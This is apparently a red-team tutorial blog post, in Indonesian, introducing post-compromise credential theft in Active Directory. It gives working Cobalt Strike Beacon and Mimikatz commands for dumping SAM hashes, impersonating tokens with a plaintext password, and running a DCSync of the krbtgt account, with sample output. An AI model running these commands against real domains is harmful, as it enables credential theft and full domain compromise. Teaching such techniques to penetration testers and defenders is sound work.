---
title: '[Credential Theft] 01 - Introduction'
date: 2023-07-26 14:51:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, credential theft, mimikatz, cobalt strike]     # TAG names should always be lowercase
author: nairpaa
---

Setelah melakukan [*privilege escalation*](/posts/windows-privilege-escalation/) pada komputer korban, kita dapat melakukan pencarian kredensial pengguna lain yang ada pada komputer tersebut.

Kredensial ini dapat berupa *plain text* (username dan password), *hash* (NTLM, AES, DCC, NetNTLM, dll), dan tiket kerberos.

Pemanfaatan kredensial ini dapat digunakan untuk [User Impersonation](/posts/user-impersonation/).

## 0x1 - Beacon + Mimikatz

Cobalt Strike memiliki versi bawaan `Mimikatz` yang dapat kita gunakan untuk mengekstrak berbagai jenis kredensial.

`Mimikatz` pada *Beacon* tidak dapat menjalankan dua perintah yang berhubungan, seperti:

```powershell
beacon> mimikatz token::elevate
beacon> mimikatz lsadump::sam
```

Pada Cobalt Strike 4.8, kita bisa menjalankan beberapa perintah `Mimikatz` dalam satu baris.

```powershell
beacon> mimikatz token::elevate; lsadump::sam #  Setiap perintah dipisahkan oleh ';'
```

*Beacon* juga memiliki konvensi perintahnya sendiri dengan menggunakan simbol `!` dan `@` sebagai "*modifiers*".

Simbol `!` berarti meningkatkan *Beacon* ke `SYSTEM` sebelum menjalankan perintah yang diberikan. Ini berguna dalam kasus-kasus di mana kita berjalan dalam `high-integrity` tetapi perlu meng-*impersonate* `SYSTEM`.  

Dalam banyak kasus, `!` adalah pengganti langsung untuk `token::elevate`. Sebagai contoh:

```powershell
beacon> mimikatz !lsadump::sam # Tidak perlu menjalankan 'token::elevate'
```

Simbol `@` akan meng-*impersonate* token *Beacon* sebelum menjalankan perintah. Ini akan berguna jika `Mimikatz` perlu berinteraksi dengan *remote system*, seperti [DCSync](/posts/dcsync-attack/).

Ini juga kompatibel dengan *impersonation primitives* lainnya seperti `make_token` dan `steal_token`.  Sebagai contoh:

```powershell
beacon> getuid # Menampilkan informasi user saat ini
[*] You are DEV\myanto

beacon> make_token DEV\namina S3CURIty # Membuat token menggunakan kredensial
[+] Impersonated DEV\namina (netonly)

beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt # DCSync dengan meng-impersonate akun DEV\namina
[DC] 'dev.example.io' will be the domain
[DC] 'dc-2.dev.example.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **
```


## 0x2 - Table of Contents

1. [NTLM Hashes](/posts/ntlm-hash/)
2. [Kerberos Encryption Keys](/posts/kerberos-encryption-keys/)
3. [Security Account Manager](/posts/security-account-manager/)
4. [Domain Cache Credentials](/posts/domain-cache-credentials/)
5. [Extracting Kerberos Tickets](/posts/extracting-kerberos-ticket/)
6. [DCSync Attack](/posts/dcsync-attack/)
7. Password Cracking Tips & Tricks